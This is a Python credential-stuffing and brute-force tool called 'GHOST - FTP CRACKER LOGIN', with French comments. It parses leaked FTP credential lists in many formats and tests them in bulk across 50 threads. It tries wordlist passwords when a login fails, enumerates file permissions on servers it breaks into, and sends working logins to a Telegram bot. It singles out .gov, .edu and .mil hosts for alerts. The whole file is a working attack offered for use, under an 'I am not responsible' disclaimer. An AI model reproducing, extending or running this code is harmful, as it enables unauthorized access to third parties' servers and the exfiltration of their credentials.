import os
import re
from ftplib import FTP, error_perm
from rich.console import Console
from datetime import datetime
import requests
from pystyle import Colors, Colorate, Center
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading

# Remplace par ton Token de bot Telegram et l'ID de ton chat
TELEGRAM_TOKEN = ''  # Remplace par ton token de bot Telegram
CHAT_ID = ''  # Remplace par ton chat ID ou celui de ton groupe

# Liste des domaines à vérifier
SECURE_DOMAINS = ['.gov', '.edu', '.gouv', '.org', '.mil', '.int', 'gob', 'go']


def clear_terminal():
    os.system('cls' if os.name == 'nt' else 'clear')


def print_banner():
    console = Console()
    console.print(banner, description)


description = """
         .-.
       .'   `.          ----------------------------
       :g g   :         | GHOST - FTP CRACKER LOGIN|  
       : o    `.        |       @CODE BY HackFut   |
      :         ``.     ----------------------------
     :             `.
    :  :         .   `.
    :   :          ` . `.
     `.. :            `. ``;
        `:;             `:' 
           :              `.
            `.              `.     . 
              `'`'`'`---..,___`;.-'

              This script is designed to test FTP server login using credentials provided in an input file.
              It checks if the domain belongs to a secure category, such as .gov, .edu, .org, etc.
              When a successful FTP login is made on a secure domain, the script sends an alert via the Telegram API.
              The script handles multiple line formats in the input file for FTP login details.
              Successful logins are saved in a Good_Ftp.txt file, while failed logins are saved in Bad_Ftp.txt.

              Supported formats:
                1. host:user:password
                2. host:user:password:port
                3. host - user;password - port
                4. ftp://hostname;user;pass
                5. Host: ... User: ... Password: ...
                6. url|username|password
                7. host:port:username:password
                8. host:port,user,password
                9. AUTO  -> tries ALL formats automatically on the same file

              The required dependencies are requests, rich, and pystyle.
"""

banner = """
          #Contact : t.me/HackfutS3c
          #Github  : https://github.com/HackfutSecRoot
          #License : MIT  
          [Warning] I am not responsible for the way you will use this program [Warning]"""

print(Colorate.Horizontal(Colors.red_to_yellow, Center.XCenter(banner)))
print(Colorate.Horizontal(Colors.blue_to_green, Center.XCenter(description)))


def send_telegram_message(message):
    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
    params = {
        'chat_id': CHAT_ID,
        'text': message,
        'parse_mode': 'HTML'
    }
    try:
        response = requests.get(url, params=params, timeout=10)
        return response.json()
    except Exception as e:
        print(f"[!] Telegram error: {e}")
        return {}


def check_ftp_login(hostname, port=21, user=None, password=None):
    try:
        ftp = FTP()
        ftp.connect(hostname, port, timeout=10)
        ftp.login(user, password)

        files = ftp.nlst()
        file_permissions = {}
        for file in files:
            try:
                file_info = ftp.sendcmd(f"LIST {file}")
                file_permissions[file] = file_info.split()[0]
            except Exception as e:
                file_permissions[file] = f"Unable to get permissions: {e}"

        ftp.quit()
        return True, file_permissions
    except (error_perm, Exception):
        return False, {}


def check_domain_security_and_send_alert(hostname, user, password):
    for domain in SECURE_DOMAINS:
        if domain in hostname:
            print(f"\n[] Security alert triggered for domain: {hostname}")
            success, _ = check_ftp_login(hostname, user=user, password=password)
            if success:
                message = f"[] [Security Alert] The domain {hostname} belongs to a high-security category ({domain}). Connection successful!\n"
                message += f"[] Details:\nUsername: {user}\nPassword: {password}"
                send_telegram_message(message)
                return True
            else:
                print(f"Failed to login to {hostname} even though it's a secure domain.")
    return False


def test_passwords_from_file(hostname, port, user, password_file):
    with open(password_file, 'r', encoding='utf-8', errors='ignore') as file:
        for line in file:
            password = line.strip()
            success, file_permissions = check_ftp_login(hostname, port, user, password)
            if success:
                return True, password, file_permissions
    return False, None, {}


def fast_check_single(hostname, port, user, password, timeout=5):
    try:
        ftp = FTP()
        ftp.connect(hostname, port, timeout=timeout)
        ftp.login(user, password)
        ftp.quit()
        return True
    except Exception:
        return False


def fast_checker(credentials_list, max_workers=50, timeout=5):
    good = []
    bad = []
    total = len(credentials_list)
    done = 0

    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        futures = {
            executor.submit(fast_check_single, h, p, u, pw, timeout): (h, p, u, pw, line)
            for h, p, u, pw, line in credentials_list
        }

        for future in as_completed(futures):
            h, p, u, pw, line = futures[future]
            done += 1
            try:
                success = future.result()
            except Exception:
                success = False

            current_time = datetime.now().strftime("%H:%M:%S")
            progress = f"[{done}/{total}]"

            if success:
                good.append(line)
                print(f"\n[{progress}] [\033[1;33m{current_time}\033[0m] - [\033[1;37m{h}\033[0m] - [\033[1;34m{u}\033[0m] - [\033[1;34m{pw}\033[0m] - [\033[1;32mFAST OK\033[0m]")
            else:
                bad.append(line)

    return good, bad


# ==========================================================
#  PARSING AUTOMATIQUE / MULTI-FORMAT
# ==========================================================

def is_valid_port(value):
    try:
        p = int(value)
        return 1 <= p <= 65535
    except (ValueError, TypeError):
        return False


def is_valid_host(host):
    """Vérifie grossièrement qu'un host ressemble à un hostname/IP."""
    if not host:
        return False
    host = host.strip()
    if host.startswith("ftp://") or host.startswith("http://") or host.startswith("https://"):
        return True
    # hostname ou IP
    if re.match(r'^[A-Za-z0-9_\-\.]+(\.[A-Za-z]{2,})?$', host):
        return True
    return False


def clean_host(hostname):
    """Nettoie un host (retire schéma, chemin, port éventuel)."""
    h = hostname.strip()
    for prefix in ("ftp://", "http://", "https://"):
        if h.startswith(prefix):
            h = h[len(prefix):]
            break
    # Retirer un éventuel chemin
    h = h.split('/')[0]
    return h.strip('[] ')


def parse_line_auto(line):
    """
    Essaie tous les formats connus et retourne un tuple
    (hostname, port, user, password) ou None si aucun format ne correspond.
    Ordre : du plus spécifique au plus générique.
    """
    raw = line.strip()
    if not raw:
        return None

    # ---------- Format 5 : Host: ... User: ... Password: ... ----------
    if "Host:" in raw and "User:" in raw and "Password:" in raw:
        try:
            hostname = raw.split("Host:")[1].split("identifier")[0].strip()
            user = raw.split("User:")[1].split("Password:")[0].strip()
            password = raw.split("Password:")[1].strip()
            return clean_host(hostname), 21, user, password
        except Exception:
            pass

    # ---------- Format 3 : host - user;password - port ----------
    if ' - ' in raw:
        parts = raw.split(' - ')
        if len(parts) == 3:
            hostname = parts[0].strip().strip('[]')
            up = parts[1].strip().strip('[]').split(';')
            if len(up) == 2:
                user, password = up
                port = parts[2].strip().strip('[]')
                if is_valid_port(port):
                    return clean_host(hostname), int(port), user, password

    # ---------- Format 8 : host:port,user,password ----------
    # ex: hotelsouvenir.it:21,info@hotelsouvenir.it,molinari999.
    m = re.match(r'^(.+?):(\d+)\s*,\s*([^,]+)\s*,\s*(.+)$', raw)
    if m:
        hostname, port, user, password = m.groups()
        if is_valid_port(port):
            return clean_host(hostname), int(port), user.strip(), password.strip()

    # ---------- Format 6 : url|username|password ----------
    if '|' in raw:
        parts = [p.strip() for p in raw.split('|')]
        if len(parts) == 3:
            hostname, user, password = parts
            hostname = clean_host(hostname)
            # port éventuel dans hostname
            if ':' in hostname and '/' not in hostname:
                try:
                    h, p = hostname.split(':')
                    if is_valid_port(p):
                        return clean_host(h), int(p), user, password
                except ValueError:
                    pass
            return hostname, 21, user, password

    # ---------- Format 4 : ftp://host;user;pass ----------
    if raw.startswith("ftp://") and ';' in raw:
        tmp = raw[len("ftp://"):]
        parts = tmp.split(';')
        if len(parts) == 3:
            hostname, user, password = parts
            hostname = clean_host(hostname)
            if ':' in hostname:
                try:
                    h, p = hostname.split(':')
                    if is_valid_port(p):
                        return clean_host(h), int(p), user, password
                except ValueError:
                    pass
            return hostname, 21, user, password

    # ---------- Formats basés sur ':' ----------
    if ':' in raw:
        parts = raw.split(':')

        # Format 1 : host:user:password
        if len(parts) == 3:
            h, u, p = parts
            if is_valid_host(h):
                return clean_host(h), 21, u, p

        # Format 2 : host:user:password:port
        # Format 7 : host:port:username:password
        elif len(parts) == 4:
            a, b, c, d = parts
            # Cas 7 : 2e champ est un port valide et 4e n'est pas un port
            if is_valid_port(b) and not is_valid_port(d):
                return clean_host(a), int(b), c, d
            # Cas 2 : 4e champ est un port valide
            if is_valid_port(d) and not is_valid_port(b):
                return clean_host(a), int(d), b, c
            # Ambigu : on tente en priorité format 7 si 2e champ numérique
            if is_valid_port(b):
                return clean_host(a), int(b), c, d
            if is_valid_port(d):
                return clean_host(a), int(d), b, c

    return None


# ==========================================================
#  TRAITEMENT PRINCIPAL
# ==========================================================

def process_ftp_file(input_file, format_choice, password_file, fast_mode=False):
    good_file = "Good_Ftp.txt"
    bad_file = "Bad_Ftp.txt"
    console = Console()

    credentials = []

    with open(input_file, 'r', encoding='utf-8', errors='ignore') as infile:
        for line in infile:
            line_stripped = line.strip()
            if not line_stripped:
                continue

            parsed = None

            # ---------- Mode AUTO (choix 9) ----------
            if format_choice == 9:
                parsed = parse_line_auto(line_stripped)
                if parsed is None:
                    print(f"[AUTO] Invalid line format: {line_stripped}")
                    continue

            # ---------- Formats explicites ----------
            elif format_choice == 1:
                parts = line_stripped.split(':')
                if len(parts) == 3:
                    parsed = (clean_host(parts[0]), 21, parts[1], parts[2])
                else:
                    print(f"Invalid line format: {line_stripped}")
                    continue

            elif format_choice == 2:
                parts = line_stripped.split(':')
                if len(parts) == 4:
                    hostname, user, password, port = parts
                    if is_valid_port(port):
                        parsed = (clean_host(hostname), int(port), user, password)
                    else:
                        print(f"Invalid port: {port}, skipping line: {line_stripped}")
                        continue
                else:
                    print(f"Invalid line format: {line_stripped}")
                    continue

            elif format_choice == 3:
                parts = line_stripped.split(' - ')
                if len(parts) == 3:
                    hostname = parts[0].strip('[]')
                    up = parts[1].strip('[]').split(';')
                    if len(up) == 2:
                        user, password = up
                        port = parts[2].strip('[]')
                        if is_valid_port(port):
                            parsed = (clean_host(hostname), int(port), user, password)
                        else:
                            print(f"Invalid port: {port}, skipping line: {line_stripped}")
                            continue
                    else:
                        print(f"Invalid line format: {line_stripped}")
                        continue
                else:
                    print(f"Invalid line format: {line_stripped}")
                    continue

            elif format_choice == 4:
                tmp = line_stripped
                if tmp.startswith("ftp://"):
                    tmp = tmp[len("ftp://"):]
                parts = tmp.split(';')
                if len(parts) == 3:
                    hostname, user, password = parts
                    parsed = (clean_host(hostname), 21, user, password)
                else:
                    print(f"Invalid line format: {line_stripped}")
                    continue

            elif format_choice == 5:
                if "Host:" in line_stripped and "User:" in line_stripped and "Password:" in line_stripped:
                    hostname = line_stripped.split("Host:")[1].split("identifier")[0].strip()
                    user = line_stripped.split("User:")[1].split("Password:")[0].strip()
                    password = line_stripped.split("Password:")[1].strip()
                    parsed = (clean_host(hostname), 21, user, password)
                else:
                    print(f"Invalid line format: {line_stripped}")
                    continue

            elif format_choice == 6:
                parts = line_stripped.split('|')
                if len(parts) == 3:
                    hostname, user, password = [p.strip() for p in parts]
                    hostname = clean_host(hostname)
                    if ':' in hostname and '/' not in hostname:
                        try:
                            h, p = hostname.split(':')
                            if is_valid_port(p):
                                parsed = (clean_host(h), int(p), user, password)
                            else:
                                parsed = (hostname, 21, user, password)
                        except ValueError:
                            parsed = (hostname, 21, user, password)
                    else:
                        parsed = (hostname, 21, user, password)
                else:
                    print(f"Invalid line format: {line_stripped}")
                    continue

            elif format_choice == 7:
                parts = line_stripped.split(':')
                if len(parts) == 4:
                    hostname, port, user, password = parts
                    if is_valid_port(port):
                        parsed = (clean_host(hostname), int(port), user, password)
                    else:
                        print(f"Invalid port: {port}, skipping line: {line_stripped}")
                        continue
                else:
                    print(f"Invalid line format: {line_stripped}")
                    continue

            elif format_choice == 8:
                # host:port,user,password
                m = re.match(r'^(.+?):(\d+)\s*,\s*([^,]+)\s*,\s*(.+)$', line_stripped)
                if m:
                    hostname, port, user, password = m.groups()
                    if is_valid_port(port):
                        parsed = (clean_host(hostname), int(port), user.strip(), password.strip())
                    else:
                        print(f"Invalid port: {port}, skipping line: {line_stripped}")
                        continue
                else:
                    print(f"Invalid line format: {line_stripped}")
                    continue

            else:
                print(f"Invalid format choice: {format_choice}")
                return

            if parsed is None:
                print(f"[!] Could not parse: {line_stripped}")
                continue

            hostname, port, user, password = parsed
            credentials.append((hostname, port, user, password, line.rstrip('\n')))

    # --- Mode Fast Checker ---
    if fast_mode:
        console.print(f"\n[bold cyan]🚀 Fast Checker activé sur {len(credentials)} cibles...[/bold cyan]")
        good, bad = fast_checker(credentials, max_workers=50, timeout=5)

        with open(good_file, 'w', encoding='utf-8') as f:
            f.write('\n'.join(good) + ('\n' if good else ''))
        with open(bad_file, 'w', encoding='utf-8') as f:
            f.write('\n'.join(bad) + ('\n' if bad else ''))

        for line in good:
            send_telegram_message(f"⚡ Fast Check OK\n{line}")

        print(f"\n[\033[1;32m Good FTP logins saved to '{good_file}'.\033[0m")
        print(f"[\033[1;31m Bad FTP logins saved to '{bad_file}'.\033[0m")
        return

    # --- Mode normal (avec permissions + Telegram) ---
    with open(good_file, 'w', encoding='utf-8') as good_outfile, \
         open(bad_file, 'w', encoding='utf-8') as bad_outfile:
        for hostname, port, user, password, original_line in credentials:
            check_domain_security_and_send_alert(hostname, user, password)

            current_time = datetime.now().strftime("%H:%M:%S")

            success, file_permissions = check_ftp_login(hostname, port, user, password)

            if not success and password_file:
                success, new_password, file_permissions = test_passwords_from_file(hostname, port, user, password_file)
                if success:
                    password = new_password

            if success:
                good_outfile.write(original_line + '\n')
                print(f"\n[\033[1;33m{current_time}\033[0m] - [\033[1;37m{hostname}\033[0m] - [\033[1;34m{user}\033[0m] - [\033[1;34m{password}\033[0m] - [\033[1;32mSuccessfully logged in\033[0m]")

                message = f"W0ot Leak Ftp\nHostname: {hostname}\n"
                message += f"Username: {user}\n"
                message += f"Password: {password}\n"
                message += "Permission files:\n"
                for file, perm in file_permissions.items():
                    message += f"{file}: {perm}\n"

                send_telegram_message(message)
            else:
                bad_outfile.write(original_line + '\n')
                print(f"\n[\033[1;33m{current_time}\033[0m] - [\033[1;37m{hostname}\033[0m] - [\033[1;34m{user}\033[0m] - [\033[1;34m{password}\033[0m] - [\033[1;31mFailed login\033[0m]")

    print(f"\n[\033[1;32m Good FTP logins saved to '{good_file}'.")
    print(f"\n[\033[1;31m Bad FTP logins saved to '{bad_file}'.")


def main():
    clear_terminal()
    print_banner()

    print("\033[1;34m[] Choose the format of the input file:\n\n")
    print("1. host:user:password")
    print("2. host:user:password:port")
    print("3. host - user;password - port")
    print("4. ftp://hostname;user;pass")
    print("5. Host: ... User: ... Password: ...")
    print("6. url|username|password")
    print("7. host:port:username:password")
    print("8. host:port,user,password")
    print("9. \033[1;32mAUTO\033[0m (detect and parse ALL formats in the same file)")
    print("\033[1;37m")

    try:
        format_choice = int(input("\033[1;34m[] Enter your choice (1-9): \033[1;37m"))
    except ValueError:
        print("\033[1;31m[] Invalid choice\033[0m")
        return

    if format_choice not in (1, 2, 3, 4, 5, 6, 7, 8, 9):
        print("\033[1;31m[] Invalid choice\033[0m")
        return

    input_file = input("\n\033[1;34m[] Enter The List \033[1;93m: \033[1;37m")

    fast_choice = input("\033[1;34m[] Enable Fast Checker mode? (y/n) \033[1;93m: \033[1;37m").strip().lower()
    fast_mode = fast_choice in ('y', 'yes', 'o', 'oui')

    password_file = ""
    if not fast_mode:
        password_file = input("\033[1;34m[] Enter The Password File (leave empty to skip) \033[1;93m: \033[1;37m").strip()

    process_ftp_file(input_file, format_choice, password_file, fast_mode=fast_mode)


if __name__ == "__main__":
    main()